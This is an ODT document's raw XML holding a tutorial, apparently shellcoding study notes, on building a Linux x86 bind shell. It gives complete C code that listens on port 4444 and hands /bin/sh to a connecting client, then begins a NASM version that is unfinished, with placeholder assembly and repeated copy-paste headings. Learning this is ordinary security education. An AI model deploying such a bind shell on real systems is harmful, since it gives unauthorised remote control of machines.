      <text:p text:style-name="P6"><text:s text:c="13"/>-1 on error: errno = EBADF (oldfd is not a valid descriptor) <text:s text:c="6"/></text:p>
      <text:p text:style-name="P6"><text:s text:c="34"/>EBADF (newfd is out of range) <text:s text:c="16"/></text:p>
      <text:p text:style-name="P6"><text:s text:c="34"/>EMFILE (too many descriptors for the process) </text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"><text:s text:c="2"/>NOTES: the old descriptor is closed with dup2()!</text:p>
      <text:p text:style-name="P6">With this particular call, we have the close operation, and the actual descriptor duplication, wrapped up in one system call. In addition, it is guaranteed to be atomic, which essentially means that it will never be interrupted by an arriving signal. The entire operation will transpire before returning control to the kernel for signal dispatching. With the original dup() system call, programmers had to perform a close() operation before calling it. That resulted in two system calls, with a small degree of vulnerability in the brief amount of time which elapsed between them. If a signal arrived during that brief instance, the descriptor duplication would fail. Of course, dup2() solves this problem for us.</text:p>
      <text:p text:style-name="P7">So we will add some lines as following:</text:p>
      <text:p text:style-name="P7">// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)</text:p>
      <text:p text:style-name="P9">for(i = 0; i &lt;= 2; i++) dup2(newsockfd, i); </text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8">Now we also need to execute some kind of bash, like the following:</text:p>
      <text:p text:style-name="P8">// execute sh shell</text:p>
      <text:p text:style-name="P8"><text:tab/>execve( "/bin/sh", NULL, NULL );</text:p>
      <text:p text:style-name="P9">Now we can remove the string manipulation stuff also. The clean code looks like:</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Also, we need to change the listen parameter, because we don't want to have 5 in there.</text:p>
      <text:p text:style-name="P9">int listen(int s, int backlog);</text:p>
      <text:p text:style-name="P9">The backlog parameter can mean a couple different things depending on the system you on, but loosely it is how many pending connections you can have before the kernel starts rejecting new ones. <text:span text:style-name="T6">Setting it to 0 will allow connections. If you want to be on the safe side, you can increase it to allow more connections.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">So the clean #c shellcode looks like this:</text:p>
      <text:p text:style-name="P10"><text:tab/>/* A simple server in the internet domain using TCP</text:p>
      <text:p text:style-name="P10"><text:tab/> <text:s text:c="2"/>The port number is passed as an argument */</text:p>
      <text:p text:style-name="P10"><text:tab/>#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P10"><text:soft-page-break/><text:tab/>#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P10"><text:tab/>#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P10"><text:tab/>#include &lt;netinet/in.h&gt;</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:tab/>int main(void)</text:p>
      <text:p text:style-name="P10"><text:tab/>{</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> int sockfd, newsockfd, portno; //file descriptor, client file descriptor, port number</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> socklen_t clilen; //socket length for new connections</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> </text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> struct sockaddr_in serv_addr, cli_addr; //server listen address, client address</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> </text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> sockfd = socket(AF_INET, SOCK_STREAM, 0); //create TCP socket http://man7.org/linux/man-pages/man7/socket.7.html</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> portno = 4444; //port to listen on</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> serv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> serv_addr.sin_addr.s_addr = INADDR_ANY; // listen on any address, converted to network byte order</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> serv_addr.sin_port = htons(portno); // server port, converted to network string order</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)); //bind to socket http://man7.org/linux/man-pages/man2/bind.2.html</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> listen(sockfd,0); //listen on socket http://man7.org/linux/man-pages/man2/listen.2.html</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> clilen = sizeof(cli_addr); // accept new connections</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen); // accept new connections</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:tab/><text:tab/> // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> dup2(newsockfd, 0);</text:p>
      <text:p text:style-name="P10"><text:s text:c="9"/>dup2(newsockfd, 1);</text:p>
      <text:p text:style-name="P10"><text:s text:c="9"/>dup2(newsockfd, 2); //http://man7.org/linux/man-pages/man2/dup.2.html</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> // execute sh shell</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> execve("/bin/sh", NULL, NULL); //http://man7.org/linux/man-pages/man2/execve.2.html</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> </text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> close(newsockfd); //close socket</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/> close(sockfd); //close socket</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:tab/><text:tab/> return 0; </text:p>
      <text:p text:style-name="P10"><text:tab/>}</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10">Now compile it and see what happens:</text:p>
      <text:p text:style-name="P11">KEP1</text:p>
      <text:p text:style-name="P11">Ubuntu-2015-02-03-10-56-05.png</text:p>
      <text:p text:style-name="P12">Ignore the warning and execute the program:</text:p>
      <text:p text:style-name="P12">Ubuntu-2015-02-03-10-58-20.png</text:p>
      <text:p text:style-name="P13">Now a connection to it will show that the shell has been executed and bind to the socket. </text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14"><text:soft-page-break/>Now let's do the same thing in NASM. The steps we need to do:</text:p>
      <text:list xml:id="list6307642071455416952" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P47">socket-socket<text:span text:style-name="T10">call</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">socket-bind</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">socket-listen</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">socket-accept</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">dup2</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P47">execve</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P15">Determine the interrupts using:</text:p>
      <text:p text:style-name="P15">less /usr/include/i386-linux-gnu/asm/unistd_32.h</text:p>
      <text:list xml:id="list112910225154618" text:continue-numbering="true" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P48">socket-socket<text:span text:style-name="T10">call</text:span> <text:span text:style-name="T7">= 102 = 0x66</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P48">socket-bind</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P48">socket-listen</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P48">socket-accept</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P48">dup2 <text:span text:style-name="T7">= 63 = 0x3F</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P48">execve <text:span text:style-name="T7">= 11 = 0xB</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P16">Ok, now using the “man” pages we can determine the specifics:</text:p>
      <text:p text:style-name="P16">man socket, <text:span text:style-name="T9">man bind, man listen, man accept</text:span></text:p>
      <text:p text:style-name="P16">SEE ALSO</text:p>
      <text:p text:style-name="P16">accept(2), bind(2), connect(2), fcntl(2), getpeername(2), <text:s/>getsockname(2), <text:s/>getsockopt(2), <text:s/>ioctl(2), <text:s/>listen(2), <text:s/>read(2), <text:s/>recv(2), select(2), send(2), shutdown(2), socketpair(2), write(2), getprotoent(3), ip(7), socket(7), tcp(7), udp(7), unix(7)</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16">So, what we need is:</text:p>
      <text:list xml:id="list112910225160876" text:continue-numbering="true" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P49">socket-socket<text:span text:style-name="T10">call</text:span> <text:span text:style-name="T7">= 102 = 0x66 ()</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P49">socket-bind <text:span text:style-name="T8">= 0x66 ()</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P49">socket-listen <text:span text:style-name="T8">= 0x66 ()</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P50">socket-accept <text:span text:style-name="T8">= 0x66 ()</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P49">dup2 <text:span text:style-name="T7">= 63 = 0x3F <text:s/>()</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P49">execve <text:span text:style-name="T7">= 11 = 0xB <text:s/>()</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P17">man socketcall:</text:p>
      <text:p text:style-name="P17">NAME</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>socketcall - socket system calls</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">SYNOPSIS</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>int socketcall(int call, unsigned long *args);</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">DESCRIPTION</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>socketcall() <text:s/>is <text:s/>a <text:s/>common <text:s/>kernel <text:s/>entry point for the socket system calls. <text:s/>call determines which socket function to invoke. <text:s/>Args points to a block containing the actual arguments, which are passed through to the appropriate call.</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>User programs should call the appropriate functions by their usual names. <text:s/>Only standard library implementors and kernel hackers need to know about socketcall().</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">man socket</text:p>
      <text:p text:style-name="P17">NAME</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>socket - create an endpoint for communication</text:p>
      <text:p text:style-name="P17"><text:soft-page-break/></text:p>
      <text:p text:style-name="P17">SYNOPSIS</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>#include &lt;sys/types.h&gt; <text:s text:c="9"/>/* See NOTES */</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="7"/>int socket(int domain, int type, int protocol);</text:p>
      <text:p text:style-name="P17">DESCRIPTION</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>socket() creates an endpoint for communication and returns a descriptor.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="7"/>The <text:s/>domain <text:s/>argument specifies a communication domain; this selects the protocol family which will be used for communication. <text:s/>These families are defined in &lt;sys/socket.h&gt;. <text:s/>The currently understood formats include:</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="7"/>Name <text:s text:c="15"/>Purpose <text:s text:c="25"/>Man page</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_UNIX, AF_LOCAL <text:s text:c="2"/>Local communication <text:s text:c="13"/>unix(7)</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_INET <text:s text:c="12"/>IPv4 Internet protocols <text:s text:c="9"/>ip(7)</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_INET6 <text:s text:c="11"/>IPv6 Internet protocols <text:s text:c="9"/>ipv6(7)</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_IPX <text:s text:c="13"/>IPX - Novell protocols</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_NETLINK <text:s text:c="9"/>Kernel user interface device <text:s text:c="4"/>netlink(7)</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_X25 <text:s text:c="13"/>ITU-T X.25 / ISO-8208 protocol <text:s text:c="2"/>x25(7)</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_AX25 <text:s text:c="12"/>Amateur radio AX.25 protocol</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_ATMPVC <text:s text:c="10"/>Access to raw ATM PVCs</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_APPLETALK <text:s text:c="7"/>Appletalk <text:s text:c="23"/>ddp(7)</text:p>
      <text:p text:style-name="P17"><text:s text:c="7"/>AF_PACKET <text:s text:c="10"/>Low level packet interface <text:s text:c="6"/>packet(7)</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="7"/>The socket has the indicated type, which specifies the communication semantics. <text:s/>Currently defined types are:</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="7"/>SOCK_STREAM <text:s text:c="4"/>Provides sequenced, reliable, two-way, connection-based byte streams. <text:s/>An out-of-band data transmission mechanism may be supported.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="7"/>SOCK_DGRAM <text:s text:c="5"/>Supports datagrams (connectionless, unreliable messages of a fixed maximum length).</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="7"/>SOCK_SEQPACKET <text:s/>Provides <text:s/>a <text:s/>sequenced, <text:s/>reliable, <text:s/>two-way <text:s/>connection-based <text:s/>data <text:s/>transmission path for datagrams of fixed maximum length; a consumer is required to read an entire packet with each input system call.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P18">SOCK_RAW <text:s text:c="7"/>Provides raw network protocol access.</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="7"/>SOCK_RDM <text:s text:c="7"/>Provides a reliable datagram layer that does not guarantee ordering.</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="7"/>SOCK_PACKET <text:s text:c="4"/>Obsolete and should not be used in new programs; see packet(7).</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="7"/>Some socket types may not be implemented by all protocol families; for example, SOCK_SEQPACKET is not implemented for AF_INET.</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="7"/>Since Linux 2.6.27, the type argument serves a second purpose: in addition to specifying a socket type, it may include the bitwise OR of any of the following values, to modify the behavior of socket():</text:p>
      <text:p text:style-name="P18"><text:soft-page-break/></text:p>
      <text:p text:style-name="P18"><text:s text:c="7"/>SOCK_NONBLOCK <text:s text:c="2"/>Set <text:s/>the O_NONBLOCK file status flag on the new open file description. <text:s/>Using this flag saves extra calls to fcntl(2) to achieve the same result.</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="7"/>SOCK_CLOEXEC <text:s text:c="3"/>Set the close-on-exec (FD_CLOEXEC) flag on the new file descriptor. <text:s/>See the description of <text:s/>the <text:s/>O_CLOEXEC <text:s/>flag <text:s/>in open(2) for reasons why this may be useful.</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"><text:s text:c="7"/>The protocol specifies a particular protocol to be used with the socket. <text:s/>Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0. <text:s/>However, it <text:s/>is <text:s/>possible <text:s/>that <text:s/>many protocols may exist, in which case a particular protocol must be specified in this manner. <text:s/>The protocol number to use is specific to the “communication domain” in which communication is to take place; see protocols(5). <text:s/>See getprotoent(3) on how to map protocol name strings to protocol numbers.</text:p>
      <text:p text:style-name="P20">More details on protocol numbers:</text:p>
      <text:p text:style-name="P34">less /usr/include/linux/in.h </text:p>
      <text:p text:style-name="P34">/* Standard well-defined IP protocols. <text:s/>*/</text:p>
      <text:p text:style-name="P34">enum {</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_IP = 0, <text:s text:c="14"/>/* Dummy protocol for TCP <text:s text:c="14"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_ICMP = 1, <text:s text:c="12"/>/* Internet Control Message Protocol <text:s text:c="3"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_IGMP = 2, <text:s text:c="12"/>/* Internet Group Management Protocol <text:s text:c="2"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_IPIP = 4, <text:s text:c="12"/>/* IPIP tunnels (older KA9Q tunnels use 94) */</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_TCP = 6, <text:s text:c="13"/>/* Transmission Control Protocol <text:s text:c="7"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_EGP = 8, <text:s text:c="13"/>/* Exterior Gateway Protocol <text:s text:c="11"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_PUP = 12, <text:s text:c="12"/>/* PUP protocol <text:s text:c="24"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_UDP = 17, <text:s text:c="12"/>/* User Datagram Protocol <text:s text:c="14"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_IDP = 22, <text:s text:c="12"/>/* XNS IDP protocol <text:s text:c="20"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_DCCP = 33, <text:s text:c="11"/>/* Datagram Congestion Control Protocol */</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_RSVP = 46, <text:s text:c="11"/>/* RSVP protocol <text:s text:c="23"/>*/</text:p>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_GRE = 47, <text:s text:c="12"/>/* Cisco GRE tunnels (rfc 1701,1702) <text:s text:c="3"/>*/</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"><text:s text:c="2"/>IPPROTO_IPV6 <text:s text:c="2"/>= 41, <text:s text:c="9"/>/* IPv6-in-IPv4 tunnelling <text:s text:c="13"/>*/</text:p>
      <text:p text:style-name="P20">TCP would be #6</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P51">#1</text:p>
      <text:p text:style-name="P19">So, there will be a socket call with the following parameters:</text:p>
      <text:p text:style-name="P18">domain: AF_INET</text:p>
      <text:p text:style-name="P18">type: SOCK_STREAM</text:p>
      <text:p text:style-name="P18">protocol: <text:span text:style-name="T11">0</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P21">Now, we need to push all these stu<text:span text:style-name="T12">f</text:span>f on the stack in reverse order, so protcol, type, domain. <text:span text:style-name="T12">Ok, but how do I know what are the values for AF_INET and SOCK_STREAM?</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P22">Look into the socket.h in your <text:span text:style-name="T13">include</text:span> directory. In my case it was here:</text:p>
      <text:p text:style-name="P23">less /usr/include/i386-linux-gnu/bits/socket_type.h</text:p>
      <text:p text:style-name="P23">SOCK_STREAM = 1</text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P23">less /usr/include/i386-linux-gnu/bits/socket.h</text:p>
      <text:p text:style-name="P23">#define PF_INET <text:s text:c="8"/>2 <text:s text:c="6"/>/* IP protocol family. <text:s/>*/</text:p>
      <text:p text:style-name="P23">#define AF_INET <text:s text:c="8"/>PF_INET</text:p>
      <text:p text:style-name="P22"><text:soft-page-break/></text:p>
      <text:p text:style-name="P24">So we send this: proto, type, domain: 0,<text:span text:style-name="T14">1,2</text:span></text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P21">Assembly code:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P25">XXXXXXXXXXXXX</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P26">#2 socket bind</text:p>
      <text:p text:style-name="P33">So in this case we will need to call socket with “bind” subcall. List of subcalls are here:</text:p>
      <text:p text:style-name="P33">less /usr/include/linux/net.h</text:p>
      <text:p text:style-name="P33">#define SYS_SOCKET <text:s text:c="5"/>1 <text:s text:c="14"/>/* sys_socket(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P33">#define SYS_BIND <text:s text:c="7"/>2 <text:s text:c="14"/>/* sys_bind(2) <text:s text:c="17"/>*/</text:p>
      <text:p text:style-name="P33">#define SYS_CONNECT <text:s text:c="4"/>3 <text:s text:c="14"/>/* sys_connect(2) <text:s text:c="14"/>*/</text:p>
      <text:p text:style-name="P33">#define SYS_LISTEN <text:s text:c="5"/>4 <text:s text:c="14"/>/* sys_listen(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P33">#define SYS_ACCEPT <text:s text:c="5"/>5 <text:s text:c="14"/>/* sys_accept(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">man bind</text:p>
      <text:p text:style-name="P28">SYNOPSIS</text:p>
      <text:p text:style-name="P28"><text:s text:c="7"/>#include &lt;sys/types.h&gt; <text:s text:c="9"/>/* See NOTES */</text:p>
      <text:p text:style-name="P28"><text:s text:c="7"/>#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"><text:s text:c="7"/>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</text:p>
      <text:p text:style-name="P30">DESCRIPTION</text:p>
      <text:p text:style-name="P30"><text:s text:c="7"/>When <text:s/>a <text:s/>socket <text:s/>is <text:s/>created <text:s/>with <text:s/>socket(2), <text:s/>it exists in a name space (address family) but has no address assigned to it. <text:s/>Bind() assigns the address specified by addr to the socket referred to by the file descriptor sockfd. <text:s/>addrlen specifies the size, in bytes, of the address structure pointed to by addr. <text:s/>Traditionally, this operation is called “assigning a name to a socket”.</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"><text:s text:c="7"/>It is normally necessary to assign a local address using bind() before a SOCK_STREAM socket may receive connections (see accept(2)).</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"><text:s text:c="7"/>The rules used in name binding vary between address families. <text:s/>Consult the manual entries in Section 7 for detailed information. <text:s/>For</text:p>
      <text:p text:style-name="P30"><text:s text:c="7"/>AF_INET see ip(7), for AF_INET6 see ipv6(7), for AF_UNIX see unix(7), for AF_APPLETALK see ddp(7), for AF_PACKET see <text:s/>packet(7), <text:s/>for AF_X25 see x25(7) and for AF_NETLINK see netlink(7).</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"><text:s text:c="7"/>The <text:s/>actual structure passed for the addr argument will depend on the address family. <text:s/>The sockaddr structure is defined as something like:</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"><text:s text:c="11"/>struct sockaddr {</text:p>
      <text:p text:style-name="P30"><text:s text:c="15"/>sa_family_t sa_family;</text:p>
      <text:p text:style-name="P30"><text:s text:c="15"/>char <text:s text:c="7"/>sa_data[14];</text:p>
      <text:p text:style-name="P30"><text:s text:c="11"/>}</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P30"><text:s text:c="7"/>The only purpose of this structure is to cast the structure pointer passed in addr in order to avoid compiler warnings.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P31"><text:soft-page-break/>So let's set the parameters:</text:p>
      <text:p text:style-name="P29">int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</text:p>
      <text:p text:style-name="P32">In plain text:</text:p>
      <text:p text:style-name="P32">bind (sockfd, sockaddress, addrlen)</text:p>
      <text:p text:style-name="P38">sockaddr requires s<text:span text:style-name="T17">p</text:span>ecial attention. <text:span text:style-name="T15">Sockfd will be the pointer we stored as the result of the last syscall.</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P39">To see the contents of the structure, we need to look into:</text:p>
      <text:p text:style-name="P35">less /usr/include/linux/in.h </text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P39">/* Structure describing an Internet (IP) socket address. */</text:p>
      <text:p text:style-name="P39">#define __SOCK_SIZE__ <text:s text:c="2"/>16 <text:s text:c="13"/>/* sizeof(struct sockaddr) <text:s text:c="5"/>*/</text:p>
      <text:p text:style-name="P39">struct sockaddr_in {</text:p>
      <text:p text:style-name="P39"><text:s text:c="2"/>__kernel_sa_family_t <text:s/>sin_family; <text:s text:c="4"/>/* Address family <text:s text:c="14"/>*/</text:p>
      <text:p text:style-name="P39"><text:s text:c="2"/>__be16 <text:s text:c="15"/>sin_port; <text:s text:c="6"/>/* Port number <text:s text:c="17"/>*/</text:p>
      <text:p text:style-name="P39"><text:s text:c="2"/>struct in_addr <text:s text:c="7"/>sin_addr; <text:s text:c="6"/>/* Internet address <text:s text:c="12"/>*/</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P40">Also, the value of Address family is in the same file:</text:p>
      <text:p text:style-name="P40">/* Address to accept any incoming messages. */</text:p>
      <text:p text:style-name="P40">#define INADDR_ANY <text:s text:c="13"/>((unsigned long int) 0x00000000)</text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P41">Port number is obvious, it's a number in hex.</text:p>
      <text:p text:style-name="P41">Struc<text:span text:style-name="T16">t</text:span> in_addr will be AF_INET=0x2</text:p>
      <text:p text:style-name="P41"/>
      <text:p text:style-name="P53">So, the structure to push will be:</text:p>
      <text:p text:style-name="P54"><text:span text:style-name="T18">Sockaddr structure saved reference in ECX:</text:span></text:p>
      <text:p text:style-name="P54">0x0 <text:span text:style-name="T18">(sin_addr)</text:span>, 0x115C (<text:span text:style-name="T18">sin_port</text:span> 4444), 0x2 <text:span text:style-name="T18">(sin_family)</text:span></text:p>
      <text:p text:style-name="P54"/>
      <text:p text:style-name="P55">Bind call:</text:p>
      <text:p text:style-name="P54"><text:span text:style-name="T18">0x10=address length(16), ECX=pointer to sockaddr, ESI=sockfd</text:span></text:p>
      <text:p text:style-name="P53"/>
      <text:p text:style-name="P56">Assembly:</text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P57">#3 Listen:</text:p>
      <text:p text:style-name="P58">To create a listener, look at man listen first:</text:p>
      <text:p text:style-name="P58">SYNOPSIS</text:p>
      <text:p text:style-name="P58"><text:s text:c="7"/>#include &lt;sys/types.h&gt; <text:s text:c="9"/>/* See NOTES */</text:p>
      <text:p text:style-name="P58"><text:s text:c="7"/>#include &lt;sys/socket.h&gt;</text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58"><text:s text:c="7"/>int listen(int sockfd, int backlog);</text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58">DESCRIPTION</text:p>
      <text:p text:style-name="P58"><text:s text:c="7"/>listen() <text:s/>marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2).</text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58"><text:s text:c="7"/>The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.</text:p>
      <text:p text:style-name="P58"/>
      <text:p text:style-name="P58"><text:soft-page-break/><text:s text:c="7"/>The backlog argument defines the maximum length to which the queue of pending connections for sockfd <text:s/>may <text:s/>grow. <text:s text:c="2"/>If <text:s/>a <text:s/>connection request <text:s/>arrives <text:s/>when <text:s/>the <text:s/>queue is full, the client may receive an error with an indication of ECONNREFUSED or, if the underlying protocol supports retransmission, the request may be ignored so that a later reattempt at connection succeeds.</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P60">So in this case we will need to call socket with “bind” subcall. List of subcalls are here:</text:p>
      <text:p text:style-name="P60">less /usr/include/linux/net.h</text:p>
      <text:p text:style-name="P60">#define SYS_SOCKET <text:s text:c="5"/>1 <text:s text:c="14"/>/* sys_socket(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P60">#define SYS_BIND <text:s text:c="7"/>2 <text:s text:c="14"/>/* sys_bind(2) <text:s text:c="17"/>*/</text:p>
      <text:p text:style-name="P60">#define SYS_CONNECT <text:s text:c="4"/>3 <text:s text:c="14"/>/* sys_connect(2) <text:s text:c="14"/>*/</text:p>
      <text:p text:style-name="P60">#define SYS_LISTEN <text:s text:c="5"/>4 <text:s text:c="14"/>/* sys_listen(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P60">#define SYS_ACCEPT <text:s text:c="5"/>5 <text:s text:c="14"/>/* sys_accept(2) <text:s text:c="15"/>*/</text:p>
      <text:p text:style-name="P59"/>
      <text:p text:style-name="P59">Pretty simple, we need to call listen (sockfd, <text:span text:style-name="T19">0</text:span>). <text:span text:style-name="T19">0 for default, it would work with higher value.</text:span></text:p>
      <text:p text:style-name="P62"/>
      <text:p text:style-name="P63">Assembly:</text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P63">#4</text:p>
      <text:p text:style-name="P63">Accept:</text:p>
      <text:p text:style-name="P61">So in this case we will need to call socket with “bind” subcall. List of subcalls are here:</text:p>
